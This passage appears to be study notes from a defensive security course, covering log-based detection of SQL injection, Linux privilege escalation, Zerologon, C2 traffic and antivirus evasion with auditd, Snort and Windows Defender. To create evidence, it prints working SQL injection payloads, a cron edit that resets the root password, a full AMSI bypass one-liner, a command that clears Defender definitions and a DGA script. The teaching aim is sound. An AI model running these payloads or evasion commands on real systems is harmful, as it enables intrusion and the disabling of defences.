                with open(log_file, "r") as file:
                    for line in file:
                        for match in re.finditer(web_log_regex_cookie, line, re.S):
                            log_line = (re.match(web_log_regex_cookie, line)).groups()
                            for match in re.finditer(shellshock_regex, log_line[7], re.S):
                                if log_line[3] != '200':
                                    print("[!] - Shellshock attempt DETECTED in %s" % log_file)
                                elif log_line[3] == '200':
                                    print("[!] - Shellshock attack  SUCCEDED in %s" % log_file)
                                    print(log_line)
```

## SQL Injection

`https://megacorpone.local/tshirts?color=purple'+UNION+SELECT+username+passwords+FROM+administrators--`

Since the statement `1=1` is always true, the application is going to return the `tshirt_id` only if it exists in the database.

`https://megacorpone.local/tshirt_model=scoop'+AND+1=1`

If the application does not return any kind of output, regardless of whether the query succeeded or not, time-based blind SQL injection can be employed as such:

`https://megacorpone.local/tshirt_model=scoop'+AND+IF(1=1,+sleep(20),+false)`


```bash
sudo truncate /var/log/apache2/*.log --size 0
```

```bash
cat /var/log/apache2/access.log
```

We have the Apache web server already preconfigured with **ModSecurity**.

**ModSecurity** offers detection and prevention capabilities against a number of different web application attack vectors and also provides the ability of increasing the log level to help with investigations.

A special file, named `modsec_audit.log`, is created to store these kinds of events.

Filter out all of the POST requests followed by the next 50 lines.

```bash
sudo cat /var/log/apache2/modsec_audit.log | awk '/-A--/,/-F--/'
```

By selectively trimming through the `awk` command the output comprised between the ModSec specific headers, `-A--` (audit log header) and `-F--` (response header), we can now spot the SQL injection payload.

```bash
sudo cat /var/log/apache2/modsec_audit.log | grep 'detected SQLi'
```

# Linux Privilege Escalation

## Becoming a User

```bash
cat /etc/passwd | grep offsec
```

```bash
sudo -l
```

```bash
su bob
sudo -l
```

```bash
sudo cat /var/log/auth.log | grep "sudo:"
```

```bash
sudo cat /etc/shadow
```

```bash
sudo cat /var/log/auth.log | grep shadow
```

`python3 sudo_privesc.py`

```bash
#!/usr/bin/env python

import re
import os.path

centos_auth_log_file_path = "/var/log/secure"
ubuntu_auth_log_file_path = "/var/log/auth.log"

auth_log_files = [centos_auth_log_file_path,ubuntu_auth_log_file_path]

regex_sudo_privesc_attempt = 'sudo:.*command not allowed'

for log_file in auth_log_files:
        if os.path.isfile(log_file) :
                with open(log_file, "r") as file:
                    for line in file:
                        for match in re.finditer(regex_sudo_privesc_attempt, line, re.S):
                            print("[*] Found 'sudo' privilege escalation attempt:\n\t"   + line,end = '')
```

Impersonate the private key's owner by connecting to localhost

```bash
ssh bob@localhost -i /home/alice/stolen_id_rsa
```

User alice successfully authenticated through password via SSH and, directly after, the user bob received a valid public-key login via SSH

No hard evidence that alice has actively used the private key to login as bob

```bash
cat /var/log/auth.log
```

`aureport` tool efficiently inspects the very detailed logs generated by the audit daemon.

When correctly configured, it can also collect any commands typed by any logged in user, thus acting like a key-logger.

Enable this feature by adding the following line to the `/etc/pam.d/sshd` configuration file.

```
session required pam_tty_audit.so enable=*
```

This line instructs the SSH authentication module to enable TTY auditing by relying on the `pam_tty_audit.so` shared library.

`enable=*` activates TTY auditing for any user on the system.

```bash
sudo systemctl restart auditd
```

The `-tty` keyword will filter for only TTY events, grouping each event by specific fields to improve readability.

```bash
sudo aureport --tty
```

Running the command with the `-tty` option outputs every keystroke pressed.

Beside the evidence of the entire `ssh bob@localhost -i /home/alice/stolen_id_rsa` command, we have visibility of the user ID that actually typed it, which is `1002`.

Confirm this is indeed the user alice:

```bash
grep alice /etc/passwd
```

Although this is helpful for gathering real evidence about a user's activities, this approach will **not scale well** in cases which only provide access to the raw audit logs.

=> Inspect the source of the logs, `auditd` logs.

Audit logs are generated by the **Linux Audit Framework**, which is comprised of a kernel module and several user-mode tools that can be combined to inspect events at the system-call level.

User commands are encoded in **hexadecimal**.

Dump the contents of `/var/log/audit/audit.log`, grepping first by "type=TTY" and then further filtering events by alice's UID.

```bash
sudo cat /var/log/audit/audit.log | grep "type=TTY" | grep " uid=1002"
```

2 hits on user's 1002 activity; both events have values in the data field.

The `data` field holds the actual keystrokes run by the user, stored in hexadecimal format.

The last hex-represented ASCII value of the string is `0D`, corresponding to to the non-printable **carriage return** character that will break `xxd` functionality if not removed.

=> Use the `sed` tool to replace any occurrence of `0D` with a printable white space value (`20`).

The `-r` option instructs `xxd` to convert values from hexadecimal to binary > Output the data in plain text format with the `-p` parameter.

```bash
echo "73736820...40D" | sed 's/0D/20/g'  | xxd -r -p
```

The script inspects each line of the `/var/log/audit/audit.log` file:

`python3 audit_decoder.py 1002`

```python
#!/usr/bin/env python

import re
import sys
import os.path
import binascii


def usage():
    print("Usage: "   + sys.argv[0] + " [uid]")
    print("Example: " + sys.argv[0] + " 1001")
    sys.exit()


def log_file_parser(uid):
        audit_log_file  = "/var/log/audit/audit.log"
        regex_audit     = "^type=TTY.*"+" uid=" + uid +".*data=.*"

        if os.path.isfile(audit_log_file) :
                with open(audit_log_file, "r") as file:
                    for line in file:
                        for match in re.finditer(regex_audit, line, re.S):
                            print("[*] Found the following user's audit data belonging to UID:%s" % uid)
                            encoded_commands = ((line.split("data=")[1])).strip()
                            decoded_commands = (binascii.a2b_hex(encoded_commands))
                            print(decoded_commands)
                            print("---")

if __name__ == '__main__':
    if len(sys.argv) > 1:

        uid    = sys.argv[1]
        log_file_parser(uid)

    else:
        usage()
```

## Backdooring a User

2 files are responsible for executing aliases and Bash functions (`.bashrc`) and setting environmental variables (`.profile`); both are executed upon every new SSH login.

```bash
ls -asl /home/bob/.bashrc
```

```bash
echo 'echo "hello from bob .bashrc"' >> /home/bob/.bashrc
```

```bash
ssh bob@192.168.51.12
```

Run the `auditctl` command to watch (`-w`) the 2 configuration files for any write and attribute change operation (`wa`), and we'll assign the 'privesc' keyword for later look-up

```bash
sudo auditctl -w /home/bob/.bashrc  -p wa -k privesc
sudo auditctl -w /home/bob/.profile -p wa -k privesc
```

Verify that the rules are validated and in effect

```bash
sudo auditctl -l
```

Audit rules configured through auditctl will not be persistent across reboots. To make them permanent, rules have to be added to the `/etc/audit/rules.d/audit.rules` file.

Run the `aureport` tool along with the `-k` option to filter based on key value, in our case "privesc".

```bash
sudo aureport -k
```

```
1. 08/30/21 07:29:46 privesc yes /usr/sbin/auditctl 1000 232
2. 08/30/21 07:29:51 privesc yes /usr/sbin/auditctl 1000 239
3. 08/30/21 07:44:20 privesc yes /home/offsec/SOC-200/Linux_Server_Side_Attacks/Shellshock/bash-4.3/bash 1002 287
```

The first two lines of the report are referring to the `auditctl` rules we performed as the offsec user (auid `1000`).

The third event stating that the executable used to access bob's `.bashrc` is a specific version of bash.

We can also pinpoint the exact auid of the user that implanted the backdoor, which is `1002` and thus corresponds to `alice`.

To enhance analysis, the aureport tool supports the `-i` option that interprets user IDs and translates them into **usernames**.

The `auid` value is assigned every time a user logs in and it remains unchanged for the entire session, even if the user impersonates other identities (like becoming root through the `su` or `sudo` commands).

E.g., the user bob managed to elevate to superuser via a privilege escalation technique, and subsequent events are recorded in the audit logs as follows:

```bash
sudo cat /var/log/audit/audit.log
```

```
type=TTY msg=audit(1630395261.553:494): tty pid=3437 uid=0 auid=1001 ses=23 major=136 minor=0 comm="sh" data=636174202F6574632F7061737377640A
```

`python3 audit_key_search.py privesc`

```python
#!/usr/bin/env python

import re
import sys
import os.path
import binascii


def usage():
    print("Usage: "   + sys.argv[0] + " [key]")
    print("Example: " + sys.argv[0] + " privesc")
    sys.exit()


def log_file_parser(keyarg):
    audit_log_file  = "/var/log/audit/audit.log"
    regex_audit     = ".*key=\"" + keyarg +"\".*"

    if os.path.isfile(audit_log_file) :
        with open(audit_log_file, "r") as file:
            for line in file:
                for match in re.finditer(regex_audit, line, re.S):
                    print("[*] Found audit logs based on the following key: %s" % keyarg)
                    auid        = (line.split("auid=")[1]).split()[0]
                    event_type  = (line.split("type=")[1]).split()[0]
                    print("event-type: %s" % event_type)
                    print("auid: %s" % auid)
                    try:
                        exe   = (((line.split("exe=")[1])).strip()).split()[0]  
                        print("program executed: %s" % exe)               
                    except(IndexError):
                        pass
                    print("---")

if __name__ == '__main__':
    if len(sys.argv) > 1:

        keyarg    = sys.argv[1]
        log_file_parser(keyarg)

    else:
        usage()
```

## Abusing System Programs

The concept of `UID` (User ID) in relation to files and user activity.

how user identifiers are related to processes, also known as process credentials.

When a user- or a system-automated script launches a process, it inherits the UID/GID of its initiating script: this is known as **real UID/GID**.

The **effective UID/GID** was introduced, which represents the actual value that's being checked when performing sensitive operations.

```bash
passwd
ps u -C passwd
```

The `passwd` program is running as the `root` user: this is needed for it to access and modify the `/etc/shadow` file 

With the passwd PID (2078)

```bash
grep Uid /proc/2078/status
```

passwd behaves differently because the binary program has a special flag named Set-User-ID, or SUID 

```bash
ls -asl /usr/bin/passwd
```

The SUID flag is depicted as the s flag. This flag sets the effective UID of the running process to the executable owner's user ID, in this case root.

```bash
chmod u+s <program> 
```

Since `audit` is running at the kernel level, permanent rules cannot be disabled even by `root`, unless a reboot is performed, an event that should always trigger the incident response team.

configure audit rules to monitor root behavior (Log any activity of processes, either on x86 or x64 architectures, with effective UIDs equal to zero (root) that are also invoking the `execve` system call which is ultimately responsible for executing programs throughout a shell. We have then assigned a common `root_cmds` key for quick lookups)

```bash
sudo auditctl -a exit,always -F arch=b64 -F euid=0 -S execve -k root_cmds
sudo auditctl -a exit,always -F arch=b32 -F euid=0 -S execve -k root_cmds
```

Run the `ausearch` tool, filtering by our custom key and the executable bash. We'll also issue the `-i` option to interpret any numerical value, like UIDs, into usernames, as well as translate timestamps.

```bash
sudo ausearch -k root_cmds -i -x bash
```

Detect that the offsec user (tracked by the auid) has become root (euid) and executed the bash shell as superuser.

## Weak Permissions

```bash
ls -asl /etc/passwd
```

Multiple cron jobs can be configured on the user's own crontab through the `crontab -e` command.

Inspect preconfigured crontab for the root user

```bash
sudo crontab -l
```

`clear_history.py` Python script is scheduled to run every minute with root privileges

```python
#!/usr/bin/env python3
import os
import sys
try:
   os.system('cat /dev/null > /home/offsec/.bash_history ')
except:
    sys.exit()
```

```bash
ls -asl /home/offsec/SOC-200/Linux_Privilege_Escalation/cron_scripts/clear_history.py
```

modify the `clear_history.py` script by adding the following statement in the try block to change the root password to 'pwnd'

```bash
os.system("echo 'root:pwnd' | sudo chpasswd")
```

```bash
sudo auditctl -w /home/offsec/SOC-200/Linux_Privilege_Escalation/cron_scripts/ -p wa -k cron_scripts
```

```bash
sudo ausearch -k cron_scripts -i
```

- A PROCTITLE event containing the entire command used to modify the script through nano editor.
- 2 PATH events; one event related to the target file, and the other to the parent folder.
- A CWD event indicating that the folder from which the command was executed is alice's home folder.

```bash
python3 audit_key_search.py cron_scripts
```

A user that obtained root permissions could dump the content of the `/etc/shadow` file and try to perform an offline crack of the hashed root password in order to obtain unrestricted and unlimited access through legitimate channels, such as SSH.

The 2 audit rules that we previously configured to monitor root account activity won't serve our purpose here because only catch `execve` system calls, while dumping a file is done using either the `open` or `openat` system call.

log any write, attribute change, or read access to the file (war) and the etc_shadow look-up key.

```bash
sudo auditctl -w /etc/shadow -p war -k etc_shadow
```

retrieve the content of the shadow password file as the root user

```bash
cat /etc/shadow
```

```bash
sudo ausearch -k etc_shadow -c cat -i
```

# Network Detections

**NetFlow**: understand the activity occurring on a network (produce a metadata-only summary of the network flows.)

There are a few iterations of this mechanism based on **proprietary** tooling, such as Qflow and pFlow, 

Quickly find unusual connections (high data throughput or malicious IP addresses), but not storing any information about the packet payload.

## Intrusion Detection Systems

## Detecting Attacks 

Snort rules consist of 2 main components: the rule header and the rule options.

The rule header dictates the action to take (usually alert) and then checks any network-related data, such as the transport protocol (TCP, UDP, or ICMP), source and destination ports/IPs, and the direction of the communication.

Rule options are made by 2 sub-categories:

1. General Rule Options provides classification information

2. Detection Options implements the actual detection routine, based on a given pattern.

In order to maximize performance, we will filter the rule headers first.

In this Module lab, the snort01 machine acts as router between the 192.168.51.0/24 subnet, which simulates a public network, and the 172.16.51.0/24 subnet, which serves as a private, internal network.

A simple rule that alerts whenever ICMP traffic is detected on the local network interface Snort is listening to.

The rule below needs to be added in `/usr/local/etc/rules/local.rules` on the snort01 machine, which is already preconfigured with Snort on both network interfaces.

`alert icmp $HOME_NET any <> $EXTERNAL_NET any ( msg:"ICMP Traffic Detected"; sid:10000001; metadata:policy security-ips alert;)`

alert on ICMP traffic originating from local networks ($HOME_NET) to any external network ($EXTERNAL_NET), in a bidirectional fashion. Next, the rule options, delimited by round brackets, include the log message, the snort id, and the metadata tag.

```bash
sudo systemctl restart snort3_external
```

```bash
ping 192.168.51.40 -c 1
```

```bash
cat /var/log/snort/alert_fast.txt
```

E.g., A known vulnerability, Zerologon (CVE-2020-1472), which involves the Microsoft NETLOGON protocol and was addressed in August 2020.

This flaw, affecting the cryptographic AES-CFB8 implementation in Windows, allows an unauthenticated actor to gain domain administrator privileges by establishing a local Netlogon session.
Among the published exploits, we find that ComputeNetlogonCredential accepts an 8-byte challenge that is used to perform a cryptographic operation that returns an 8-byte result.

In order for this operation to function, a random initialization vector (IV) must be generated for each plaintext object to be encrypted with the same key. The ComputeNetlogonCredential function uses a fixed 16-byte value, which is highly guessable and subject to tampering.

`alert tcp any any -> $HOME_NET any ( msg:"OS-WINDOWS Microsoft Windows Netlogon crafted NetrServerReqChallenge elevation of privilege attempt"; flow:to_server,established; dce_iface:uuid 12345678-1234-abcd-ef00-01234567cffb; dce_opnum:"4"; content:"|04 00|",depth 2,offset 22,fast_pattern; content:"|00 00 00|",distance 0; isdataat:7,relative; isdataat:!8,relative; byte_extract:1,0,first_cc_byte,relative; byte_test:1,=,first_cc_byte,0,relative; byte_test:1,=,first_cc_byte,1,relative; byte_test:1,=,first_cc_byte,2,relative; byte_test:1,=,first_cc_byte,3,relative; detection_filter:track by_src, count 10, seconds 10; metadata:policy balanced-ips drop,policy max-detect-ips drop,policy security-ips drop; service:dcerpc; reference:cve,2020-1472; reference:url,portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472; classtype:attempted-admin; sid:55703; rev:4; )`

`flow:to_server,established;` only inspect packets sent to the server on a previously-established TCP communication.

`dce_iface:uuid 12345678-1234-abcd-ef00-01234567cffb; dce_opnum:"4"`

The `dce_iface` rule option filters the packets based on a well-known interface, Netlogon Remote Protocol unique identifier

The `dce_opnum` filters on a specific function call, i.e. the fourth one: `NetrServerReqChallenge`.

`content:"|04 00|",depth 2,offset 22,fast_pattern`

Match (\x04\x00) at offset 22 from the packet's start of payload.

The `depth` keywords tell the Snort engine to search the specified patterns only for the first 2 bytes from the specified offset.

This pattern is going match the value "4" inside the Opnum field of the DCE/RPC header.

The `fast_pattern` option is an optimization keyword that will instruct the Snort engine to give priority to this content statement before others.

`content:"|00 00 00|",distance 0;isdataat:7,relative; isdataat:!8,relative;`

This directive starts from distance 0 and continues until it finds 3 consecutive null-bytes.

The `isdataat` keyword ensures that data exists from an offset of 7 relative to the content match and not from an offset of 8.

Detail byte-level pattern matching and comparison.

`byte_extract:1,0,first_cc_byte,relative;`

Extracts the first byte (1) at offset 0 relative to the previous content match and saves the single byte into the `first_cc_byte` variable.

Use the value saved in the variable in the following 4 directives:

```
byte_test:1,=,first_cc_byte,0,relative; 
byte_test:1,=,first_cc_byte,1,relative;
byte_test:1,=,first_cc_byte,2,relative;
byte_test:1,=,first_cc_byte,3,relative;
```

The `byte_test` operation compares the following 4 subsequent bytes to the value previously saved in `first_cc_byte` to make sure they are all equal.

The threshold that will trigger the alert.

`detection_filter:track by_src, count 10, seconds 10;`

Trigger an alert only if it matches 10 packets from the same client within 10 seconds.

```bash
cat /var/log/snort/alert_fast.txt
```

Simulate an IDS scenario where the network flows are saved into pcap files

```bash
sudo tshark -f "tcp" -i ens160 -w /home/offsec/SOC-200/Network_Detections/zerologon.pcap
```

Display Filter: `rpc_netlogon && ip.dst==172.16.51.10 && netlogon.opnum == 4`

```bash
sudo truncate -s  0 /var/log/snort/alert_fast.txt
```

filter the output to get an overview of the actual rules that have been triggered - showing only the content between the [**] and the { values and then remove any duplicate lines.

```bash
cat /var/log/snort/alert_fast.txt  | grep -o .[\*\*\].*\{ | sort -u
```

Extract the SID value located in the third field delimited by whitespaces.

```bash
cat /var/log/snort/alert_fast.txt | cut -d ':' -f 4 | sort | uniq
```

Map these SIDs into the actual rules

`python3 extract_sql_rules.py`

```python
#!/usr/bin/env python

import sys
import re
import os

snort_sql_rule_file_path = "/usr/local/etc/rules/sql.rules"

rules = os.popen("cat /var/log/snort/alert_fast.txt | cut -d ':' -f 4 | sort | uniq").read()
rules = rules.split('\n')
for rule in rules[:-1]:
    cmd = 'cat {} | grep {}'.format(snort_sql_rule_file_path,rule)
    ret = os.popen(cmd).read()
    print(ret)
```

## Detecting C2 Infrastructure

A C2 server can rely on either fixed IP or domain names in order to be reached by C2 agents.

Static IPs and domains can be quickly mapped and blocked by IPS

=> **domain flux** technique: the domain is dynamically generated by the agents at runtime through a Domain Generation Algorithm (DGA).

This kind of functionality can be embedded inside a C2 agent and customized to use any kind of input seeds to generate domains, such as custom dictionaries, prime numbers, or even other URLs.

DGA can be used by malware to set up its own C2 channel on a social media platform, like the MiniDuke malware.

`python3 dga.py 11.02.2021`

```python
import sys

def usage():
    print("Usage: "   + sys.argv[0] + " [date]")
    print("Usage: "   + sys.argv[0] + " 12.02.2021")
    sys.exit()

def generate_domain(year: int, month: int, day: int) -> str:
    domain = ""

    for i in range(0x10):
        year = ((year ^ 8 * year) >> 11) ^ ((year & 0xFFFFFFF0) << 17)
        month = ((month ^ 4 * month) >> 25) ^ 16 * (month & 0xFFFFFFF8)
        day = ((day ^ (day << 13)) >> 19) ^ ((day & 0xFFFFFFFE) << 12)
        domain += chr(((year ^ month ^ day) % 25) + 97)

    print(domain + ".com")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        date    = sys.argv[1]
        y,m,d = date.split('.')
        generate_domain(int(y),int(m),int(d))
    else:
        usage()
```

```bash
sudo powershell-empire client
(Empire) > agents
```

```bash
sudo tshark -f "tcp port 8080" -i ens160 -w /home/offsec/SOC-200/Network_Detections/empire.pcap
```

WireShark Display Filter `http`

```bash
cat /usr/local/etc/rules/c2.rules
```

`alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS ( msg:"MALWARE-CNC PowerShell Empire variant outbound connection"; flow:to_server,established; content:"/news.php HTTP/1.1|0D 0A|",fast_pattern,nocase; content:"User-Agent: Mozilla/5.0 (Windows NT 6.1|3B| WOW64|3B| Trident/7.0|3B| rv:11.0) like Gecko"; metadata:impact_flag red; service:http; reference:url,attack.mitre.org/techniques/T1086; reference:url,powershellempire.com; classtype:trojan-activity; sid:38259; rev:5; )`

Matches the beginning of the `/news.php` target URI from the beginning of the GET request, followed by the supported HTTP version, a carriage return (`0x0D`), and line feed (`0x0A`).

Matches the Empire agent's entire custom value for the `User-Agent`, including the 0x3B value to match the semicolon (;) ASCII value.

# Antivirus Alerts and Evasion

## Signature-Based Detection

We disabled remediation with the command => no actions were performed on the file after detection.

`-Scan -ScanType 3` to indicate that we're performing a custom file and directory scan.

```bat
"C:\Program Files\Windows Defender\MpCmdRun" -Scan -ScanType 3 -File C:\tools\av_alerts_evasion\signature_detect_nonstage.exe -DisableRemediation 
```

```pwsh
Start-MpScan -ScanPath C:\tools\av_alerts_evasion\signature_detect_nonstage.exe -ScanType CustomScan; Get-Date
```

Event ID 1116 is the `MALWAREPROTECTION_STATE_MALWARE_DETECTED` event 

```pwsh
Get-WDLogEvent $null "12/2/2021 10:59:00" "12/2/2021 11:00:00"
```

```pwsh
Get-WDLogEvent 1116 "12/2/2021 10:59:20" "12/2/2021 11:59:22" | Format-List
```

Retrieve a list of all threats currently awaiting mitigation

```pwsh
Get-MpThreat
```

`DidThreatExecute` field would be "True" if the detection was discovered during execution rather than a manual scan.

The `IsActive` field refers to whether Windows Defender still considers the file an active threat. Because it is enqueued for remediation, this value is set to "True".

```pwsh
Remove-MpThreat; Get-Date
```

Event 1117 reflects an action taken by Windows Defender with the symbolic name `MALWAREPROTECTION_STATE_MALWARE_ACTION_TAKEN`.

```pwsh
Get-WDLogEvent $null "12/2/2021 11:08:00" "12/2/2021 11:09:00"
```

```pwsh
Get-WDLogEvent 1117 "12/2/2021 11:08:07" "12/2/2021 11:08:09" | Format-List
```

The `Error Code` of 0 matches the Error description, confirming the operation completed successfully.

Definitions of malware and various categories are updated and stored in `%PROGRAMDATA%\Microsoft\Windows Defender\Definition Updates\Default`.

Attackers can use a command like `MpCmdRun.exe` to clear the definitions loaded into memory and render Windows Defender's concrete detections inoperable.

```bat
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Real-time Heuristic and Behavioral-Based Detection

**Heuristic-based detection** relies on various rules and algorithms to determine whether an action is considered malicious. 

- By stepping through the instruction set of a binary file or by attempting to decompile and then analyze the source code.

=> Find various patterns and program calls (as opposed to simple byte sequences) that are considered malicious.

**Behavior-based detection** dynamically analyzes the behavior of a binary file.

- By executing the file in question in an emulated environment, such as a small VM, and searching for behaviors or actions that are considered malicious.

Activating Windows Defender Antivirus in **Local Group Policy**, including the restart of Virus & threat protection.

Open Local Group Policy Editor via `gpedit.msc` > `Local Computer Policy` > `Computer Configuration` > `Administrative Templates` > `Windows Components` > `Microsoft Defender Antivirus` > `Real-time Protection`.

The `Turn off real-time protection` setting is `Enabled`. We must `Disable` this in order to enable real-time protection.

When activating real-time protection, Windows Defender will generate a configuration change with Event ID `5007`.

The `HKLM\SOFTWARE\Microsoft\Windows Defender\Features\TamperProtection` key in the Windows Registry will change from 0x0 to 0x1.

Download or execute malicious files.

```pwsh
Invoke-Webrequest -Uri http://kali:8000/signature_detect_staged.exe -OutFile signature_detect_staged.exe; Get-Date
```

```pwsh
Get-WDLogEvent $null "12/15/2021 7:13:00" "12/15/2021 7:14:00"
```

```pwsh
Get-WDLogEvent 1116 "12/15/2021 7:13:33" "12/15/2021 7:13:35" | Format-List
```

The **detection source** reveals that real-time protection has generated this event + the user `offsec` generated this event through `powershell.exe`.

Query for FileCreate events:

```pwsh
Get-SysmonEvent 11 "12/15/2021 7:13:30" "12/15/2021 7:13:35" | Format-List
```

Remove the file on-disk and get a timestamp

```pwsh
Remove-MpThreat; Get-Date
```

```pwsh
Get-WDLogEvent 1117 "12/15/2021 8:30:47" "12/15/2021 8:30:49" | Format-List
```

Because we initiated `Remove-MpThreat` from PowerShell Core, the user is not offsec but `NT AUTHORITY\LOCAL SERVICE`.

Unlike the on-demand scan, the `Detection Source` is Real-Time Protection.

## Antimalware Scan Interface (AMSI)

```pwsh
"amsiutils"
```

`AmsiTamper` label in the `Name` field

`Detection Source` for this event is `AMSI`.

```pwsh
Get-WDLogEvent 1116 "12/21/2021 8:00:00" "12/21/2021 8:01:00" | Format-List 
```

### AMSI Bypass

Query all the PowerShell script block events with Event ID `4104`

```pwsh
Get-PSLogEvent 4104 "12/22/2021 8:41:24" "12/22/2021 8:41:26"
```

```pwsh
Get-PSLogEvent 4104 "12/22/2021 8:41:24" "12/22/2021 8:41:26" | Where-Object { $_.LevelDisplayName -eq "Warning" } | Format-List
```

The `$patch` variable that is defined before overwriting a pre-determined address in the script.

```pwsh
...
$patch = [byte[]] (
    0x31, 0xC0,    # xor rax, rax
    0xC3           # ret  
)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)
...
```

```pwsh
Get-SysmonEvent $null "12/22/2021 8:41:24" "12/22/2021 8:41:26"
```

We have several `FileCreate` and `ProcessCreate` events occurring at the same time as the AMSI bypass.

```pwsh
Get-SysmonEvent 11 "12/22/2021 8:41:24" "12/22/2021 8:41:25" | Format-List
```

2 unusual file creations taking place:

1. A DLL being written to the `Temp` directory with a randomly generated name.

2. A file with the `.cmdline` extension sharing the same name as the DLL.

```pwsh
Get-SysmonEvent 1 "12/22/2021 8:41:24" "12/22/2021 8:41:26" | Format-List
```

`csc.exe`, the command-line compiler for C#. The `/fullpath @` argument specifies a single file containing additional options to be invoked when compiling code.

`cvtres.exe`, invoked by the command-line compiler. This is the Windows Resource to Object Converter, which is part of the chain of binaries used for code compilation.

Based on the `ParentCommandLine` field, we can assume that this is part of the instructions contained in the `.cmdline` file. The instructions specific to `cvtres.exe` are displayed in the `CommandLine` field. 

=> The AMSI bypass script's patching mechanism involves spontaneously writing and compiling code to replace what is loaded in memory


The `DNSEvent` and `NetworkConnect` events are relevant to the use of `Invoke-Expression` connecting back to the Kali VM.

```pwsh
Get-SysmonEvent 11 "12/22/2021 8:41:25" "12/22/2021 8:41:26" | Format-List
```

The command-line compiler overwriting the DLL that was created before by PowerShell

```pwsh
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1); Get-Date
```

```pwsh
Get-PSLogEvent 4104 "12/22/2021 12:35:06" "12/22/2021 12:35:08"
```

```pwsh
Get-PSLogEvent 4104 "12/22/2021 12:35:06" "12/22/2021 12:35:08" | Where-Object { $_.LevelDisplayName -eq "Warning" } | Format-List
```

**Verbose** script block event

```pwsh
Get-PSLogEvent 4104 "1/11/2025 18:58:49" "1/11/2025 18:59:49" | Where-Object { $_.LevelDisplayName -eq "Verbose" } | Format-List
```

# Network Evasion and Tunneling

## Egress Busting

```bash
cat /etc/iptables/rules.v4
```

`FORWARD` and `OUTPUT` chains only allow connections on common ports used for services such as FTP, SSH, SMTP, HTTP

```
...
-A FORWARD -i ens160 -o ens192 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-A FORWARD -i ens192 -o ens160 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
...
-A FORWARD -p tcp -m tcp --dport 21 -j ACCEPT
-A FORWARD -p tcp -m tcp --dport 22 -j ACCEPT
-A FORWARD -p tcp -m tcp --dport 25 -j ACCEPT
-A FORWARD -p tcp -m tcp --dport 80 -j ACCEPT
-A FORWARD -p tcp -m tcp --dport 443 -j ACCEPT
-A FORWARD -p tcp -m tcp --dport 8080 -j ACCEPT
...
-A OUTPUT -p tcp -m tcp --dport 21 -j ACCEPT
-A OUTPUT -p tcp -m tcp --dport 22 -j ACCEPT
-A OUTPUT -p tcp -m tcp --dport 25 -j ACCEPT
-A OUTPUT -p tcp -m tcp --dport 80 -j ACCEPT
-A OUTPUT -p tcp -m tcp --dport 443 -j ACCEPT
-A OUTPUT -p tcp -m tcp --dport 8080 -j ACCEPT
...
```

**Port forwarding rules** that will redirect traffic on certain ports to the internal network.

```
...
:PREROUTING ACCEPT [9:717]
:INPUT ACCEPT [0:0]
:OUTPUT ACCEPT [2:146]
:POSTROUTING ACCEPT [0:0]
-A PREROUTING -i ens160 -p tcp -m tcp --dport 80 -j DNAT --to-destination 172.16.50.11
-A PREROUTING -i ens160 -p tcp -m tcp --dport 21 -j DNAT --to-destination 172.16.50.11
...
-A POSTROUTING -d 172.16.50.11/32 -o eth1 -p tcp -m tcp --dport 80 -j SNAT --to-source 172.16.50.254
-A POSTROUTING -d 172.16.50.11/32 -o eth1 -p tcp -m tcp --dport 21 -j SNAT --to-source 172.16.50.254
COMMIT
# Completed on Tue Jan 18 09:14:47 2022
...
```

These `iptables` rules will redirect any traffic coming to the snort machine on port `80` and `21` to the same ports on the `172.16.50.11` host, which acts as a web server hosted behind the firewall.

```bash
cat /usr/local/etc/rules/local.rules
```

```
alert tcp any any -> any :20 (msg:"Malicious outbound traffic detected"; sid:10000001; metadata:policy security-ips alert;)
alert tcp any any -> any 23,24 (msg:"Malicious outbound traffic detected"; sid:10000002; metadata:policy security-ips alert;)
alert tcp any any -> any 26:52 (msg:"Malicious outbound traffic detected"; sid:10000003; metadata:policy security-ips alert;)
alert tcp any any -> any 54:79 (msg:"Malicious outbound traffic detected"; sid:10000004; metadata:policy security-ips alert;)
alert tcp any any -> any 81:442 (msg:"Malicious outbound traffic detected"; sid:10000005; metadata:policy security-ips alert;)
alert tcp any any -> any 444:1000 (msg:"Malicious outbound traffic detected"; sid:10000006; metadata:policy security-ips alert;)
```

**Egress Busting** technique often involves writing or using a custom tool that will set up a listener on the attackers box and use a firewall such as `iptables` to redirect every port to the the listener.

Next, the attacker uploads a binary to the target host, which will attempt to connect to the attacker box on a port range chosen by the attacker.

The technique essentially works by brute-forcing connections on every port until the binary detects a successful connection on a TCP port.

```bash
cat /var/log/snort/alert_fast.txt
```

=> the attacker attempted multiple connections on various sequential ports, up to TCP port 500.

## Port Forwarding and Tunneling

Configure port forwarding differently depending on the OS of the gateway.

E.g., `iptables` and the `netfilter` kernel components can be used on Linux systems
`ipfirewall` or the `ipfw4` module can be used on BSD systems.
The Network Shell or the `netsh` utility can be used on Windows systems.


Tunneling a protocol involves encapsulating it within a different protocol.

Tunneling through a VPN often causes the traffic to be encrypted by using the IPsec protocol suite while traveling between hosts. This is also the case when tunneling through the Secure Shell (`SSH`) protocol.

Tunneling can also be achieved using less common protocols such as Generic Routing Encapsulation (GRE), `HTTP`, or ICMP.

Local forwarding / tunneling allows the mapping between a local port on a host inside the network and another port on a remote host that also resides within the network.

Remote forwarding / tunneling is used to map an internal host and port and redirect the traffic, making it accessible on a specific external host.

Dynamic forwarding / tunneling is used as a dynamic tunnel rather than being constrained to a single host and port. Dynamic tunneling allows an external host to interact with multiple hosts and ports on the internal network.

## Port Forwarding and Tunneling in Practice

Implement local port forwarding on webhost (`172.16.50.11`), which they have access to and redirect traffic coming in on port `21` to the dbhost (`172.16.50.12`) host on the default MySQL port. Before proceeding with this, the attacker also turns off the currently-running FTP service.

```pwsh
